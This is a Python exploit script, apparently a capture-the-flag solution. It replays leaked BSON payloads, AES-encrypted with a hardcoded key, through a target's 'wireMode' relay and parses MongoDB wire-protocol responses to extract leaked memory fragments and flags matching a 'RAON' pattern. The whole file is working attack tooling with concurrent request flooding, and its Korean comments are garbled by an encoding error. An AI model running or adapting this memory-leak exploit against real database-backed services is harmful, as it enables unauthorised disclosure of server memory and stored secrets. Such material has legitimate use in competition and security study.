#!/usr/bin/env python3
import argparse
import sys
import json
import requests
import base64
import struct
import zlib
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import hashlib

try:
    from Crypto.Cipher import AES
except Exception:
    AES = None

# ì „ì—­ ì¹´ìš´í„° (ìŠ¤ë ˆë“œ ì•ˆì „)
lock = threading.Lock()
total_leaks = []
processed = 0

def parse_and_decompress_wire(b: bytes) -> bytes:
    if len(b) < 16:
        return b
    try:
        total_len, req_id, resp_to, op_code = struct.unpack("<IIII", b[:16])
    except:
        return b
    if total_len > len(b) or total_len < 16:
        return b
    if op_code == 2012:
        if total_len < 25:
            return b
        try:
            compressor_id = b[24]
            comp = b[25:total_len]
            if compressor_id == 2:
                return zlib.decompress(comp)
        except:
            pass
    return b[16:total_len]

def extract_leaks(resp_body: bytes) -> list[bytes]:
    leaks = []
    for m in re.finditer(rb"field name '([^']*)'", resp_body):
        data = m.group(1)
        if data and len(data) > 2 and data not in [b'?', b'a', b'$db', b'ping']:
            leaks.append(data)
    for m in re.finditer(rb"type (\d+)", resp_body):
        try:
            leaks.append(bytes([int(m.group(1)) & 0xFF]))
        except:
            pass
    return leaks

def _pkcs7_pad(b: bytes, block: int = 16) -> bytes:
    pad_len = block - (len(b) % block)
    return b + bytes([pad_len]) * pad_len

def encrypt_payload_b64_fixed_cbc(plain_bytes: bytes) -> str:
    """
    ê³ ì • íŒŒë¼ë¯¸í„°ë¡œ AES-256-CBC ì•”í˜¸í™” í›„ base64 ë¬¸ìì—´ ë°˜í™˜
    - passphrase: 'fiveHongNam!!'
    - salt: 'SALT_FOR_PBKDF2!!' (16 bytes)
    - iv:   'IV_FOR_CBC_16B!!'  (16 bytes)
    - PBKDF2: SHA-256, iter=100000, dklen=32
    """
    if AES is None:
        raise RuntimeError("PyCryptodome AES ê°€ í•„ìš”í•©ë‹ˆë‹¤ (Crypto.Cipher.AES)")
    passphrase = b'fiveHongNam!!'
    salt = b'SALT_FOR_PBKDF2!!'
    iv = b'IV_FOR_CBC_16B!!'
    key = hashlib.pbkdf2_hmac('sha256', passphrase, salt, 100000, dklen=32)
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    ct = cipher.encrypt(_pkcs7_pad(plain_bytes, 16))
    return base64.b64encode(ct).decode('ascii')

def send_one(args, idx: int, b64: str, total: int) -> tuple[int, list[bytes]]:
    global processed
    local_frags = []
    
    # ìˆ˜ì •ëœ íë¦„: base64 â†’ ë°”ì´ë„ˆë¦¬ â†’ AES ì•”í˜¸í™” â†’ base64
    try:
        # 1) base64 ë””ì½”ë”©í•˜ì—¬ BSON ë°”ì´ë„ˆë¦¬ íšë“
        bson_binary = base64.b64decode(b64)
        
        # 2) BSON ë°”ì´ë„ˆë¦¬ë¥¼ ì§ì ‘ AES ì•”í˜¸í™”
        enc_b64 = encrypt_payload_b64_fixed_cbc(bson_binary)
        
        payload = {
            "wireMode": 1,
            "payload_b64": enc_b64,
            "name": args.name
        }
    except Exception as e:
        with lock:
            processed += 1
        if args.verbose:
            print(f"[ERR] idx={idx} encrypt failed: {e}", file=sys.stderr)
        return idx, []

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "wire-relay/1.0"
    }
    
    try:
        r = requests.post(
            args.url, 
            params={"wireMode": 1}, 
            json=payload,
            headers=headers, 
            timeout=args.timeout
        )
        js = r.json()
        resp_b64 = js.get("data", "")
        
        if resp_b64:
            resp_raw = base64.b64decode(resp_b64)
            resp_body = parse_and_decompress_wire(resp_raw)
            local_frags = extract_leaks(resp_body)
            
            # ì‹¤ì‹œê°„ ì¶œë ¥ (ìœ ì˜ë¯¸í•œ leak ë°œê²¬ ì‹œ)
            if local_frags:
                with lock:
                    total_leaks.extend(local_frags)
                    processed += 1
                    # í”Œë˜ê·¸ íŒ¨í„´ í™•ì¸
                    for frag in local_frags:
                        try:
                            s = frag.decode('utf-8', errors='ignore')
                            if 'flag' in s.lower() or 'RAON' in s or 'secret' in s.lower():
                                print(f"\nğŸš¨ [HIT] idx={idx}: {s[:100]}")
                        except:
                            pass
                    if processed % 100 == 0:
                        print(f"[{processed}/{total}] leaks so far: {len(total_leaks)}")
            else:
                with lock:
                    processed += 1
        else:
            with lock:
                processed += 1
    except Exception as e:
        with lock:
            processed += 1
        if args.verbose:
            print(f"[ERR] idx={idx}: {e}", file=sys.stderr)
    
    return idx, local_frags

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", required=True)
    p.add_argument("--from-leaked", required=True, help="leaked.bin path")
    p.add_argument("--batch-out", default="batch_out.bin")
    p.add_argument("--name", default="tester")
    p.add_argument("--timeout", type=int, default=5)
    p.add_argument("--concurrency", type=int, default=20)
    p.add_argument("--verbose", action="store_true")
    args = p.parse_args()
    
    # AES ëª¨ë“ˆ ì²´í¬
    if AES is None:
        print("[!] PyCryptodome í•„ìš”: pip install pycryptodome", file=sys.stderr)
        sys.exit(1)
    
    # [B64-FULL] íŒŒì‹±
    b64_list = []
    with open(args.from_leaked, "r", errors="ignore") as f:
        for line in f:
            if line.strip().startswith("[B64-FULL]"):
                parts = line.strip().split(" ", 1)
                if len(parts) == 2:
                    b64_list.append(parts[1].strip())
    
    if not b64_list:
        print("No [B64-FULL] found", file=sys.stderr)
        sys.exit(1)
    
    print(f"[*] Loaded {len(b64_list)} payloads")
    print(f"[*] Concurrency: {args.concurrency}")
    print(f"[*] Starting...")
    
    start = datetime.now()
    
    # ë³‘ë ¬ ì‹¤í–‰
    with ThreadPoolExecutor(max_workers=args.concurrency) as ex:
        futures = [
            ex.submit(send_one, args, i, b64, len(b64_list)) 
            for i, b64 in enumerate(b64_list)
        ]
        for fut in as_completed(futures):
            pass  # ê²°ê³¼ëŠ” send_oneì—ì„œ ì‹¤ì‹œê°„ ì²˜ë¦¬
    
    elapsed = (datetime.now() - start).total_seconds()
    
    # ê²°ê³¼ ë³‘í•©
    merged = bytearray()
    seen = set()
    for frag in total_leaks:
        if frag not in seen:
            seen.add(frag)
            merged.extend(frag)
    
    print(f"\n[*] Done in {elapsed:.1f}s ({len(b64_list)/elapsed:.1f} req/s)")
    print(f"[*] Total leak fragments: {len(total_leaks)}")
    print(f"[*] Unique fragments: {len(seen)}")
    print(f"[*] Merged size: {len(merged)} bytes")
    
    # ì €ì¥
    with open(args.batch_out, "wb") as f:
        f.write(merged)
    print(f"[*] Saved: {args.batch_out}")
    
    # í”Œë˜ê·¸ íƒì§€
    merged_str = merged.decode('utf-8', errors='ignore')
    flags = re.findall(r'RAON\d{4}\{[^}]+\}', merged_str)
    if flags:
        print(f"\nğŸ‰ FLAGS FOUND:")
        for flag in set(flags):
            print(f"  {flag}")

if __name__ == "__main__":
    main()